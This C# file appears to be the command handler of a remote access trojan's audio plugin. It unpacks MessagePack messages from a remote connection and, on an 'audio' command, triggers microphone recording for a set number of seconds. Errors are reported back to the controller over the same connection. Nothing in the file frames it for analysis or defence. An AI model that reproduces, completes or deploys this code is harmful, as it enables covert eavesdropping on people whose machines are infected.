using System;
using MessagePackLib.MessagePack;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            var unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "audio":
                {
                    AudioRecorder.Audio(Convert.ToInt32(unpack_msgpack.ForcePathObject("Second").AsString));
                    break;
                }
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}